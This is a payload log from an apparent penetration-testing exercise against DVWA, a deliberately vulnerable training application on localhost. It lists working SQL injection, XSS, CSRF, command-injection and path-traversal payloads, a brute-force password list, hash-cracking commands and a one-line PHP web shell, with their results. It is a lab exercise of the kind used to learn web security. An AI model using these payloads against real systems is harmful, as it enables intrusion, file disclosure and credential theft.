@@ -1,0 +1,192 @@
+=================================================================
+DVWA WEB APPLICATION VAPT — PAYLOADS USED
+=================================================================
+Target: Damn Vulnerable Web Application (DVWA), Security Level: Low
+Tester: Mukul Kumar
+=================================================================
+
+
+-----------------------------------------------------------------
+1. SQL INJECTION
+-----------------------------------------------------------------
+Module: /vulnerabilities/sqli/
+Parameter: id
+
+Step 1 — Confirm injectability:
+'
+
+Step 2 — Authentication / logic bypass:
+1' OR '1'='1
+
+Step 3 — Data extraction (UNION-based):
+1' UNION SELECT user, password FROM users -- -
+
+Step 4 — Offline hash cracking (John the Ripper):
+Tool command:
+  echo "5f4dcc3b5aa765d61d8327deb882cf99" > hash.txt
+  john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+  john --show --format=raw-md5 hash.txt
+Result: 5f4dcc3b5aa765d61d8327deb882cf99 -> password
+
+
+-----------------------------------------------------------------
+2. BRUTE FORCE
+-----------------------------------------------------------------
+Module: /vulnerabilities/brute/
+Parameters: username, password
+
+Method: Burp Suite Intruder — Sniper attack, payload position on `password`
+          (username fixed to "admin")
+
+Password list tried (sample):
+123456
+password
+admin
+letmein
+qwerty
+abc123
+password123
+test4466
+admin123
+passsword
+john
+password123
+
+Result: password  ->  confirmed valid (anomalous response length: 4740
+        vs ~4702-4703 for all failed attempts)
+
+
+-----------------------------------------------------------------
+3. CROSS-SITE SCRIPTING — REFLECTED
+-----------------------------------------------------------------
+Module: /vulnerabilities/xss_r/
+Parameter: name
+
+Payload:
+<script>alert('XSS')</script>
+
+
+-----------------------------------------------------------------
+4. CROSS-SITE SCRIPTING — STORED
+-----------------------------------------------------------------
+Module: /vulnerabilities/xss_s/
+Parameters: txtName, mtxMessage
+
+Name field:
+test
+
+Message field (payload):
+<script>alert('Stored XSS')</script>
+
+
+-----------------------------------------------------------------
+5. CROSS-SITE SCRIPTING — DOM-BASED
+-----------------------------------------------------------------
+Module: /vulnerabilities/xss_d/
+Parameter: default (URL query parameter)
+
+Payload (full URL):
+http://localhost:8080/vulnerabilities/xss_d/?default=<script>alert('DOM XSS')</script>
+
+
+-----------------------------------------------------------------
+6. CROSS-SITE REQUEST FORGERY (CSRF)
+-----------------------------------------------------------------
+Module: /vulnerabilities/csrf/
+Parameters: password_new, password_conf, Change
+
+Malicious auto-submitting HTML (csrf_attack.html):
+-----------------------------------------------------------------
+<html>
+<body>
+<h3>Loading...</h3>
+<form action="http://localhost:8080/vulnerabilities/csrf/" method="GET">
+  <input type="hidden" name="password_new" value="hacked123">
+  <input type="hidden" name="password_conf" value="hacked123">
+  <input type="hidden" name="Change" value="Change">
+</form>
+<script>document.forms[0].submit();</script>
+</body>
+</html>
+-----------------------------------------------------------------
+
+Resulting forged request:
+http://localhost:8080/vulnerabilities/csrf/?password_new=hacked123&password_conf=hacked123&Change=Change
+
+Verification: Logged in afterwards with admin / hacked123 — successful.
+
+
+-----------------------------------------------------------------
+7. COMMAND INJECTION
+-----------------------------------------------------------------
+Module: /vulnerabilities/exec/
+Parameter: ip
+
+Baseline (legitimate use):
+127.0.0.1
+
+Command chaining — identify current user:
+127.0.0.1 && whoami
+Result: www-data
+
+Command chaining — file disclosure:
+127.0.0.1 && cat /etc/passwd
+Result: full contents of /etc/passwd disclosed (root, mysql, www-data, etc.)
+
+
+-----------------------------------------------------------------
+8. UNRESTRICTED FILE UPLOAD
+-----------------------------------------------------------------
+Module: /vulnerabilities/upload/
+Parameter: uploaded (file upload field)
+
+Malicious PHP web shell (shell.php):
+-----------------------------------------------------------------
+<?php system($_GET['cmd']); ?>
+-----------------------------------------------------------------
+
+Uploaded path (returned by application):
+../../hackable/uploads/shell.php
+
+Execution / proof of RCE:
+http://localhost:8080/hackable/uploads/shell.php?cmd=whoami
+Result: www-data
+
+
+-----------------------------------------------------------------
+9. LOCAL FILE INCLUSION (LFI)
+-----------------------------------------------------------------
+Module: /vulnerabilities/fi/
+Parameter: page
+
+Baseline:
+?page=include.php
+
+Path traversal payload:
+?page=../../../../etc/passwd
+
+Full URL:
+http://localhost:8080/vulnerabilities/fi/?page=../../../../etc/passwd
+Result: full contents of /etc/passwd disclosed
+
+
+-----------------------------------------------------------------
+10. SECURITY MISCONFIGURATION (LOW vs HIGH COMPARISON)
+-----------------------------------------------------------------
+Security level changed via: /security.php (Low -> High)
+
+Re-tested payloads at High:
+
+SQL Injection (still worked at High):
+1' OR '1'='1
+Result: returned admin/admin data — NOT mitigated at High level.
+
+XSS Reflected (blocked/sanitized at High):
+<script>alert('XSS')</script>
+Result: script tags stripped; output rendered as plain text "Hello >" —
+        mitigated at High level.
+
+
+=================================================================
+END OF PAYLOAD LOG
+=================================================================
